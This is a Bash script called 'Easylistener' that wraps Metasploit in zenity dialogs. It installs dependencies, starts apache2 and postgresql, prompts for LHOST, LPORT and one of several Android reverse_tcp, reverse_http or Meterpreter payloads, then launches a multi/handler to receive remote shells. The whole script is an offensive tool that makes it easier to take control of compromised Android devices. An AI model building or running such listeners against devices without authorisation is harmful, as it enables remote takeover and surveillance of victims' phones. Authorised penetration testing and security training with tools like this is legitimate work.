#!/bin/bash
#Copyright (C) 2020 Vickyarts
#This script is for easy use of metasploit
#This script requires zenity and xterm
#Contact me github
clear
lanip=`hostname -I`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
#Colors
green='\e[0;32m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
RedF="${Escape}[31m";
LighGreenF="${Escape}[92m"
lgreen='\e[1;32m'

#check dependencies existence
echo -e $blue "" 
echo "® Checking dependencies configuration ®" 
echo "                                       " 

# check if metasploit-framework is installed
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
which msfconsole > /dev/null 2>&1
sleep 2
else
echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
echo -e $yellow "[ ! ] Installing Metasploit-Framework "
sudo apt-get install metasploit-framework -y
echo -e $blue "[ ✔ ] Done installing ...."
which msfconsole > /dev/null 2>&1
clear
sleep 2
fi
#check if xterm is installed
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
which xterm > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] xterm -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Xterm "
sleep 2
echo -e $green ""
sudo apt-get install xterm -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which xterm > /dev/null 2>&1
fi
#check if zenity is installed
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ found ]"
which zenity > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zenity -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Zenity "
sleep 2
echo -e $green ""
sudo apt-get install zenity -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which zenity > /dev/null 2>&1
fi
# check if figlet is installed
which figlet > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Figlet............................${LighGreenF}[ found ]"
which figlet > /dev/null 2>&1
sleep 2
clear
else
echo -e $red "[ X ] Figlet  -> ${RedF}not found "
echo -e $yellow "[ ! ] Installing Figlet "
sudo apt-get install figlet -y
echo -e $blue "[ ✔ ] Done installing ...."
which figlet > /dev/null 2>&1
clear
sleep 2
fi
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
echo -e $red"[*] Stopping Services... "
processtop
sleep 1
echo ""
echo -e $yellow"[*] Thanks For Using Easylistener-script :)"
exit
}
#function start services
function process()
{	
	service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
	service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
#function lhost
function get_lhost() 
{
	lhost=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
}
#function lport
function get_lport()
{
	lport=$(zenity --title="☢ SET LPORT ☢" --text "example: 2004" --entry-text "2004" --entry --width 300 2> /dev/null)
}
#function payload
function get_payload()
{
	payload=$(zenity --list --title "☢Easy Payload ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" FALSE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
}
#function metasploit command
function metas()
{
	figlet Listener Started
	sleep 3
	xterm -T "Easy MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'"
}
#function stop services
function processtop()
{
	service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1	
	service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
#function fillblankspace
function blank()
{
	clear
	sleep 1
	figlet Listener Stopped
	sleep 5
	processtop
	clear
	sleep 2
	figlet 'Thank You for Using Easylistener :)'
	sleep 1
	exit
}

start=$(zenity --question --title="☢ Easylistener script ☢" --text "Execute the script?" --width 270 2> /dev/null)
if [ "$?" -eq "0" ];then
	process
	get_lhost
	get_lport
	get_payload
	metas
	blank	  	
else
  	clear
	exit
fi

